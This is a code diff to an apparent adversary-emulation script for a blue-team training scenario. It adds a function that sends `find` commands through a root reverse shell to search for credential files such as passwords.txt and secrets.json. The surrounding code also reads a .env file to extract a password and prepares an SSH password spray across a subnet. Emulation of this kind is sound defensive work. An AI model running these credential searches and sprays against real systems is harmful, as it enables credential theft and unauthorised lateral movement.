@@ -30,6 +30,19 @@ TARGET_USERNAME  = "john.stravidis"
 SSH_PORT         = 22
 SCAN_OUTPUT_FILE = "/tmp/cs-scan.gnmap"
 
+# Noise file patterns searched before the real .env read (T1552.001).
+# Each tuple is (filename, list_of_dirs_to_search).  All searches are
+# expected to come up empty — the point is to generate observable events in
+# the scenario log and the apache shell history that a blue team can correlate.
+_NOISE_FILE_PATTERNS = [
+    ("passwords.txt",   ["/home", "/root", "/tmp", "/var/www", "/opt"]),  # /var/www: web-app credential dumps
+    ("secrets.json",    ["/home", "/root", "/tmp", "/var/www", "/opt"]),  # /var/www: web-app credential dumps
+    ("config.backup",   ["/home", "/root", "/tmp", "/etc",     "/opt"]),  # /etc: sysadmin backup destination
+    ("credentials.txt", ["/home", "/root", "/tmp",             "/opt"]),
+    (".passwd",         ["/home", "/root",                     "/opt"]),
+    ("db_password.txt", ["/home", "/root",                     "/opt"]),
+]
+
 # Hosts to exclude from the spray attempt — pure infrastructure addresses
 # that would noise up the log without ever serving sshd-on-22 for `john`:
 #   .1   bridge gateway
@@ -95,6 +108,47 @@ def _extract_password(env_text, var_names=("WS_PASS", "JOHN_PASS", "PASSWORD")):
     return None
 
 
+def _search_noise_files(shell):
+    """Search for common sensitive file patterns via the root shell.
+
+    All searches are expected to return nothing — the function exists purely
+    to generate log-visible noise events (T1552.001) that a blue team can
+    observe when analysing the scenario.  The log lines and the `find`
+    commands sent through the shell both appear in scenario logs and apache
+    shell history respectively.
+
+    Matches are detected via a `-printf` marker rather than "any output":
+    the root reverse shell echoes a PS1 prompt (and, on some shells, the
+    command itself) into every `_run_remote` capture, so a plain emptiness
+    check would treat that prompt noise as a hit and fire the `[?]` branch on
+    every pattern.  Only lines carrying the `CS_NOISE_HIT` marker count as
+    real finds.
+    """
+    log("[*] Expanding credential search to common sensitive file patterns...")
+    any_hits = False
+    for filename, dirs in _NOISE_FILE_PATTERNS:
+        search_dirs = " ".join(dirs)
+        cmd = (
+            f"find {search_dirs} -maxdepth 4 -name {shlex.quote(filename)} "
+            f"-printf 'CS_NOISE_HIT %p\\n' 2>/dev/null"
+        )
+        out = _run_remote(shell, cmd, timeout=10)
+        hits = [
+            line[len("CS_NOISE_HIT "):]
+            for line in out.splitlines()
+            if line.startswith("CS_NOISE_HIT ")
+        ]
+        if hits:
+            any_hits = True
+            log(f"[?] Unexpected find for {filename!r}: {', '.join(hits)}")
+        else:
+            log(f"[-] {filename!r} not found in {search_dirs}")
+    if any_hits:
+        log("[*] Noise search complete — unexpected file(s) noted above")
+    else:
+        log("[*] Noise search complete — no additional credential files discovered")
+
+
 def _parse_gnmap_hosts(gnmap_text):
     """Return a list of IPs whose grepable-nmap line shows port 22/open."""
     hosts = []
@@ -123,7 +177,9 @@ def run(root_shell, subnet=INTERNAL_SUBNET, target_user=TARGET_USERNAME):
 
     # ------------------------------------------------------------------
     # Phase 1 — Credentials in files (T1552.001)
+    # Noise searches first (always fail), then the real .env read.
     # ------------------------------------------------------------------
+    _search_noise_files(root_shell)
     log(f"[*] Reading {ENV_FILE_PATH} on apache...")
     env_blob = _run_remote(root_shell, f"cat {ENV_FILE_PATH}")
     password = _extract_password(env_blob)
